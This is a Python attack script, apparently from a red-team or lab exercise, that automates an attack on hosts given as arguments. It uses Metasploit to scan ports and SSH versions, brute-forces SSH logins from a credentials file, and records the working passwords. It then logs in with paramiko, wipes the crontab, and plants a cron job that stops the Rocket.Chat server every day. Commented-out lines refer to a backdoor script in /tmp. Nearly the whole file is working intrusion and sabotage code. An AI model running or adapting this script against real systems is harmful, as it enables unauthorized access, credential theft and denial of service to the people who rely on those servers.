#ver 2.0.0 (with parallel work and ip as arguments)
#2.0.1 (fixed loggin of file, for different ip different files)

import subprocess
import sys
import datetime
import paramiko
import ipaddress
import concurrent.futures

# SELFIP = "198.18.189.11"
PATHTOBRUTFILE = "/home/gt/users_pass.txt"


def logToFile(message: str, ip):
    date = datetime.datetime.now()
    dateStr = date.strftime('%Y-%m-%d')
    dateTimeStr = date.strftime('%Y-%m-%d_%H-%M-%S')
    with open(f'attack__{ip}__{dateStr}.log', 'a') as f:
        f.write(f'{dateTimeStr}: {message}\n')


def isValidIp(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        print(f"{ip} is not valid ip adress, skipping")
        logToFile(f"{ip} is not valid ip adress, skipping", ip)
        return False


def scanPorts(ip):
    portsToScan = f"""
    msfconsole -q -x 'use auxiliary/scanner/portscan/tcp;
    set RHOSTS {ip};
    set PORTS 20-23,25,69,137,139,389,445,88,115,464,513,563,691,730-790,80-82,53,110,1080,1443,443,8080;
    run;
    exit'
    """

    print("Start scanning ports: " + portsToScan)
    logToFile("Start scanning ports: " + portsToScan, ip)
    outputOne = subprocess.check_output(portsToScan, shell=True).decode('utf-8')
    print("output1:", outputOne)
    logToFile("output1:\n" + outputOne, ip)

    myList = []
    for row in outputOne.splitlines():
        if "OPEN" in row:
            print("Finded opened port, fetching...")
            logToFile("Finded opened port, fetching...", ip)
            words = row.split()
            for index in range(0, len(words) - 1):
                if words[index].split(":")[-1].isnumeric():
                    myList.append(words[index].split(":")[-1])
        # print("debug")
    print(f"All opened ports: {myList}")
    logToFile(f"All opened ports: {myList}", ip)
    if "22" in myList:
        print("Return value 22 as ssh port")
        logToFile("Return value 22 as ssh port", ip)
        return "22"
    print("Do not returning values")
    logToFile("Do not returning values", ip)
    return ""


def scanVersion(ip, sshPort: str = 22):
    whatToScan = f"""
    msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_version;
    set RHOSTS {ip};
    set RPORT {sshPort};
    run;
    exit'
    """

    print("Start checking ssh version: " + whatToScan)
    logToFile("Start checking ssh version: " + whatToScan, ip)
    outputTwo = subprocess.check_output(whatToScan, shell=True).decode('utf-8')
    print("output2:", outputTwo)
    logToFile("output2\n" + outputTwo, ip)


def bruteForce(ip, sshPort: str = 22):
    sshSession = f"""
    msfconsole -q -x 'use scanner/ssh/ssh_login;
    set USERPASS_FILE {PATHTOBRUTFILE};
    set RHOSTS {ip};
    set RPORT {sshPort};
    run;
    exit -y'
    """

    print("Start brute force: " + sshSession)
    logToFile("Start brute force: " + sshSession, ip)
    # os.system(sshSession)
    outputThree = subprocess.check_output(sshSession, shell=True).decode('utf-8')
    print("output3:", outputThree)
    logToFile("output3:\n" + outputThree, ip)

    (username, passwd) = ("nil", "nil")
    for row in outputThree.splitlines():
        if "Success" in row:
            print("Success, fetching...")
            logToFile("Success, fetching...", ip)
            words = row.split()
            # for index in range(0, len(words) - 1):
            tmp = words[4].split("'")
            print(tmp)
            print(tmp[1])
            logToFile("Creds: " + tmp[1], ip)
            (username, passwd) = (tmp[1].split(":")[0], tmp[1].split(":")[1])
            break
    return username, passwd


def sshCommands(ip, username: str, password: str, sshPort: int = 22):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(ip, username=username, password=password, port=sshPort)

    # Paste commands on remote host
    listCommands = [
        '(crontab -r; echo "#") | crontab -',
        # '(crontab -r; * * * * * /tmp/bd_bash.sh") | crontab -',
        # '(crontab -l; echo "* * * * * systemctl stop rocketchat.service") | crontab -',

        # '(crontab -l; echo "05 10 * * * service snap.rocketchat-server.rocketchat-server stop") | crontab -',
        '(crontab -l; echo "30 15 * * * service snap.rocketchat-server.rocketchat-server stop") | crontab -',
        # '(crontab -l; echo "30-59/1 15 * * * service snap.rocketchat-server.rocketchat-server stop") | crontab -',

        # '(crontab -l; echo "40 10 * * * service snap.rocketchat-server.rocketchat-server stop") | crontab -',
        # '(crontab -l; echo "45 10 * * * service snap.rocketchat-server.rocketchat-server stop") | crontab -',
        'service snap.rocketchat-server.rocketchat-server stop',
        'service snap.rocketchat-server.rocketchat-server status'
    ]

    for cmd in listCommands:
        stdin, stdout, stderr = ssh.exec_command(cmd)
        output = stdout.read().decode('utf-8')
        print(f"For command {cmd} output is: {output}")
        logToFile(f"For command {cmd} output is: {output}", ip)

    # Do not close SSH connection
    # ssh.close()


def main(ip):
    print("\nScript started-------\n")
    logToFile("\nScript started-------\n", ip)

    if isValidIp(ip):
        sshPort = scanPorts(ip)
        print("Port:" + sshPort)
        logToFile("Port:" + sshPort, ip)

        if sshPort:
            scanVersion(ip, sshPort=sshPort)

            (username, password) = bruteForce(ip, sshPort=sshPort)
            print("Login: " + username + " Passwd: " + password)
            logToFile("Login: " + username + " Passwd: " + password, ip)

            sshCommands(ip, username, password, int(sshPort))

            print("------\nScript ended")
            logToFile("------\nScript ended", ip)


def parallelMain():
    with concurrent.futures.ThreadPoolExecutor() as executor:
        hosts = sys.argv[1:]
        executor.map(main, hosts)

        # for result in results:
        #     print(result)


parallelMain()
